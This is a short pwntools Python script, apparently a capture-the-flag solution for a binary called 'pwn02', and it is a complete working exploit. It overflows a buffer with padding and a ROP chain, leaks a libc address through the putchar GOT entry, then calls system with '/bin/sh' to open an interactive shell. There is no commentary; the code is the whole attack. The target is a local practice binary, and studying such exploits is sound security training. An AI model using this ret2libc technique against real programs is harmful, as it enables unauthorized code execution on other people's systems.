from pwn import *
context.log_level = 'debug'
p = process("./pwn02")
e = ELF("./pwn02")
p.recvuntil("time?\n")
p.sendline("134520896")
p.recvuntil("time?\n")
p.sendline('10000')
pop_ret = 0x0804898b
ppp_ret = 0x08048989
addr = 0x0804A058
payload = '1234' * 8
payload += p32(e.plt['read']) + p32(ppp_ret) + p32(0) + p32(addr) + p32(
    4) + p32(0x080486FD)
p.recvuntil("ASLR\n")
p.sendline(payload)
p.sendline(p32(e.got['putchar']))
p.recvuntil("time?\n")
p.sendline("134520896")
p.recvuntil("time?\n")
p.sendline('10000')
p.recvuntil('\x0a')
libc_base = u32(p.recv(4)) - 0x60da0
libc_system = libc_base + 0x3a940
libc_binsh = libc_base + 0x15902b
payload = '1234' * 8
payload += p32(libc_system) + p32(pop_ret) + p32(libc_binsh)
p.sendline(payload)
p.interactive()
